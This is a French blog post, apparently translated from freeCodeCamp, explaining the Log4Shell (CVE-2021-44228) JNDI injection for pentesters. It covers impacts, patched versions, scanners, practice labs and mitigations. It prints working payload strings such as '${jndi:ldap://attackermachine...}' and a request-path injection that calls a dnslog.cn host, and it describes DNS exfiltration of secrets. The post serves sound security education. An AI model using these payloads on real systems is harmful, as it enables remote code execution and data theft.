---
title: Vulnérabilité Java Log4JShell – Ce que j'ai appris cette semaine
subtitle: ''
author: Nairuz Abulhul
co_authors: []
series: null
date: '2021-12-23T21:01:00.000Z'
originalURL: https://freecodecamp.org/news/java-log4jshell-vulnerability
coverImage: https://www.freecodecamp.org/news/content/images/2021/12/photo-1542382257-80dedb725088.jpg
tags:
- name: Java
  slug: java
- name: penetration testing
  slug: penetration-testing
- name: vulnerabilities
  slug: vulnerabilities
seo_title: Vulnérabilité Java Log4JShell – Ce que j'ai appris cette semaine
seo_desc: "Last Thursday, a vulnerability was disclosed in the Log4J logging library\
  \ affecting many Java applications worldwide. \nThe vulnerability is called Log4Shell\
  \ (CVE-2021–44228). It allows an attacker to inject a crafted payload anywhere in\
  \ the requests ..."
---

Jeudi dernier, une vulnérabilité a été divulguée dans la bibliothèque de journalisation Log4J, affectant de nombreuses applications Java dans le monde.

La vulnérabilité s'appelle Log4Shell (CVE-2021–44228). Elle permet à un attaquant d'injecter une charge utile spécialement conçue n'importe où dans les requêtes qui sont analysées et exécutées par l'application vulnérable.

Il existe de nombreuses ressources sur Twitter, Reddit et YouTube concernant cette vulnérabilité épique. Je voulais créer cet article pour résumer les principales choses que j'ai apprises, les moyens de la tester en tant que pentester, et les contrôles de mitigation qui aident à prévenir l'exploitation de cette vulnérabilité.

## Aperçu de la vulnérabilité Log4Shell

La vulnérabilité **Log4Shell** est une injection Java JNDI. Ce n'est pas une nouvelle vulnérabilité, bien qu'il y ait eu une [présentation à la Blackhat en 2016 à ce sujet par Alvaro Munoz & Oleksandr Mirosh](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf).

Les anciennes versions de la bibliothèque **1.x** ne sont pas vulnérables à l'exécution de code. Les logs sont encapsulés au format chaîne comme ils devraient l'être, et ils ne sont pas analysés.

Intéressamment, la vulnérabilité a été introduite avec la nouvelle fonctionnalité **JNDI lookup** dans la version **2.0–2.15.0** qui permet à toute entrée d'être analysée et interprétée par l'application, peu importe son origine.

Cela inclut les applications web, les bases de données, les serveurs de messagerie, les routeurs, les agents de point de terminaison, les applications mobiles, les appareils IoT – vous l'appelez (si cela exécute Java, cela pourrait être vulnérable).

Ci-dessous se trouve un excellent diagramme de Rob Fuller [(@mubix)](https://twitter.com/mubix/status/1470430085169745920) montrant l'impact de cette vulnérabilité.

C'était effrayant lorsque j'ai commencé à regarder autour de la pièce pour tous les appareils qui pourraient être vulnérables. J'ai testé mon téléphone, ma montre de fitness et ma machine à laver (parce que pourquoi pas !!) via son application mobile.

J'ai obtenu des rappels DNS de tous.

![Image](https://www.freecodecamp.org/news/content/images/2021/12/Log4J-Explanation-Rob_Fuller_Mubix-1.png)

**JNDI**, ou Java Naming Directory Interface, est une API qui permet à l'application Java d'effectuer des recherches sur des objets en fonction de leurs noms. Elle prend en charge plusieurs services d'annuaire tels que **LDAP, RMI, DNS et CORBA**.

La plupart des charges utiles que j'ai vues utilisent les protocoles LDAP, DNS et RMI pour effectuer les requêtes DNS.

Pour les preuves de concept RCE, l'attaquant doit configurer un serveur LDAP pour permettre à l'application vulnérable de s'y connecter. Ainsi, les applications ciblées doivent autoriser les connexions LDAP sortantes vers le serveur contrôlé par l'attaquant pour charger l'objet malveillant.

Les **requêtes DNS** ne suffisent pas à confirmer si l'application est vulnérable à l'exécution de code à distance. Cependant, cela reste impactant, car ces requêtes peuvent exfiltrer des données sensibles qui aident à compromettre les cibles.

## Impact de la vulnérabilité Log4Shell
Les principaux impacts de cette vulnérabilité sont :
+ Exfiltration de données via DNS
+ Exécution de code à distance avec des objets Java malveillants et des serveurs LDAP rogues

## Version corrigée
La version **2.17** de Log4J est corrigée. Les correctifs **2.15.0 et 2.16.0** ont été contournés lors de la rédaction de cet article.

## Comment les attaquants exploitent Log4Shell 
L'attaquant configure un serveur LDAP rogue, crée une classe de charge utile d'exploitation et la stocke en tant qu'objet LDAP tel que **"Log4JPayload.class"** pour être référencé plus tard.

Ensuite, l'attaquant insère l'injection JNDI spécialement conçue dans toute requête susceptible d'être journalisée, telle que les chemins de requête, les en-têtes HTTP, les noms de fichiers, les métadonnées EXIF des documents/images, etc. **(voir les points d'injection ci-dessous)**.

### Exemples de charges utiles

```
${jndi:ldap://attackermachine:portnumber/Log4JPayload.class} 

${jndi:rmi://attackermachine:portnumber/Log4JPayload.class}

```

Lorsque les requêtes malveillantes sont journalisées, la bibliothèque Log4J analysera les entrées injectées et se connectera au serveur LDAP rogue pour charger la classe malveillante.

L'application exécute ensuite la classe référencée, et l'attaquant obtient une exécution de code à distance sur l'application vulnérable.

## Points d'injection
Un point d'injection principal se trouve dans les **chemins de requête**, comme dans l'exemple ci-dessous :
```GET /${jndi:ldap://c6xppah2n.dnslog.cn/d} HTTP/1.1```

Un autre point d'injection se trouve dans les **en-têtes HTTP**. Un attaquant peut injecter les charges utiles dans n'importe quel en-tête HTTP. Tous sont des points d'injection valides lors de la réalisation d'un test d'application. [Musa Şana](https://musana.net/2021/12/13/log4shell-Quick-Guide/) a compilé une liste plus exhaustive.

![Image](https://www.freecodecamp.org/news/content/images/2021/12/1_pyg0Y8AQNnklLdN-oqq8jg.png)
_Points d'injection_

Il est essentiel de se rappeler que l'exploitation ne résulte pas toujours en un rappel immédiat. Parfois, cela prend des minutes, voire des heures, pour obtenir une réponse.

J'ai attendu environ 25 minutes avant de recevoir les premiers rappels de ma montre lorsque je l'ai testée. Donc, pour les tests en boîte noire, donnez à l'application suffisamment de temps avant de décider si elle est vulnérable ou non. Soyez patient !

## Charges utiles Log4Shell
Il y a tellement de charges utiles qui ont été publiées sur Twitter ces derniers jours qu'il vaut la peine de les passer en revue. Certaines charges utiles utilisent l'obfuscation pour contourner les WAF populaires comme Akamai, Cloudflare et AWS WAF.

Ci-dessous se trouve une capture d'écran des charges utiles collectées sur Twitter.

J'ai compilé les plus intéressantes sur [Carbon snippet](https://carbon.now.sh/kUtwFTZzm3isgHSwWwKk).

![Image](https://www.freecodecamp.org/news/content/images/2021/12/image-54.png)
_Charges utiles collectées sur Twitter - [https://carbon.now.sh/kUtwFTZzm3isgHSwWwKk](https://carbon.now.sh/kUtwFTZzm3isgHSwWwKk" rel="noopener ugc nofollow)_

## Exemples d'exfiltration de données

Supposons qu'une application ne soit pas vulnérable à l'exécution de code à distance ou bloque les connexions LDAP sortantes. Dans ce cas, un attaquant ou un pentester peut toujours exploiter cette vulnérabilité pour extraire des informations sensibles telles que des clés secrètes, des jetons et des fichiers de configuration de l'application elle-même et de l'infrastructure hébergée.

Un attaquant peut ensuite exploiter les informations pour choisir le vecteur d'attaque approprié afin de compromettre l'application ciblée.

![Image](https://www.freecodecamp.org/news/content/images/2021/12/dns.png)
_Carbon Sinppet - [https://carbon.now.sh/kToUK7dCk0KJkri0qvXf](https://carbon.now.sh/kToUK7dCk0KJkri0qvXf" rel="noopener ugc nofollow)_

## Vérifications automatisées

Les analyses automatisées aident lors d'un pentest en boîte noire à effectuer des vérifications sommaires sur de nombreux hôtes. Ci-dessous se trouve la liste des principaux outils de scan connus qui peuvent vous aider à atteindre cet objectif :

+ Extensions Burp : [Log4Shell Scanner](https://portswigger.net/bappstore/b011be53649346dd87276bca41ce8e8f)
+ [Log4J Scanner par mazen160](https://github.com/fullhunt/log4j-scan)
+ Modèle Nuclei pour Log4J — id : [CVE-2021–44228](https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-44228.yaml)
+ Script Nmap NSE — [nse-log4shell](https://github.com/Diverto/nse-log4shell)

## Services de surveillance des logs DNS
Pour tester rapidement l'application, nous utilisons les services ci-dessous pour créer un jeton DNS pour notre charge utile et voir si nous obtenons des rappels.
+ **[Canary Tokens](https://canarytokens.org/generate)**
+ **[DNSlog.cn](http://www.dnslog.cn/)**
+ **[Interactsh](https://app.interactsh.com/#/)**
+ **Burp Collaborator**

## Applications vulnérables à tester :
Il existe un certain nombre d'applications vulnérables prêtes à être déployées sur GitHub, PentesterLabs et TryHackMe pour tester cette vulnérabilité.

Ma préférée est l'application Log4Shell (elle nécessite une certaine configuration et peut vous montrer ce qui se passe derrière la scène de la configuration d'un serveur LDAP rogue et de la connexion à celui-ci). Cependant, si vous voulez tester cela rapidement, la salle TryHackMe Solar est la solution.

+ **Log4jPwn** — https://github.com/leonjza/log4jpwn
+ **Log4Shell** — https://github.com/kozmer/log4j-shell-poc
+ **Défi PentestLabs** : [**Log4J RCE**](https://pentesterlab.com/exercises/log4j_rce/course), [**Log4J RCE II**](https://pentesterlab.com/exercises/log4j_rce_ii/course)
+ **Salle TryHackMe Solar** par John Hammond — https://tryhackme.com/room/solar [salle gratuite]

## Mitigations pour Log4Shell
Afin de vous protéger contre cette vulnérabilité, voici quelques étapes que vous pouvez suivre :
+ Mettre à jour vers la dernière version de Log4J — **v2.17.0.**
+ Désactiver les recherches dans les messages ```log4j2.formatMsgNoLookups=true```

+ Supprimer la classe JndiLookup du classpath ```zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class```

+ Appliquer des règles de pare-feu pour limiter les communications à quelques hôtes autorisés uniquement, et non à tout le monde. [Mick Douglas](https://twitter.com/bettersafetynet) l'explique bien dans son tweet sur le modèle IMMA ["Isoler", "Minimiser", "Surveiller" et "Défense Active"](https://twitter.com/bettersafetynet/status/1469470983190986754) !

C'est tout pour aujourd'hui. Ce fut une semaine infernale. J'ai appris beaucoup de nouvelles choses sur les injections Java et l'exploitation.

Merci d'avoir lu !!

## En savoir plus sur Log4JShell

* [Vulnérabilité Apache Log4j CVE-2021-44228 suscite des préoccupations généralisées](https://blogs.juniper.net/en-us/security/apache-log4j-vulnerability-cve-2021-44228-raises-widespread-concerns)
* [Que devez-vous savoir sur la vulnérabilité log4j (Log4Shell) ? par l'Institut SANS](https://www.youtube.com/watch?v=oC2PZB5D3Ys)
* [Approfondir Log4Shell - Exploit RCE 0Day trouvé dans Log4j](https://www.fastly.com/blog/digging-deeper-into-log4shell-0day-rce-exploit-found-in-log4j)
* [Vulnérabilité Apache log4j CVE-2021-44228 : Analyse et Mitigations](https://unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/)
* [log4shell - Guide rapide](https://musana.net/2021/12/13/log4shell-Quick-Guide/)
* [Log4Shell Zero-day Exploit Walkthrough](https://medium.com/geekculture/log4shell-zero-day-exploit-walkthrough-f42352612ca6)
* [CVE-2021-44228 - Log4j - MINECRAFT VULNÉRABLE ! (et bien plus encore)](https://www.youtube.com/watch?v=7qoPDq41xhQ&t=35s)
* [Un voyage de la manipulation JNDI/LDAP au pays des rêves de l'exécution de code à distance](https://www.youtube.com/watch?v=Y8a5nB-vy78&t=2494s)
* [Log4Shell : Injection JNDI via Log4J attaquable](https://blog.shiftleft.io/log4shell-jndi-injection-via-attackable-log4j-6bfea2b4896e)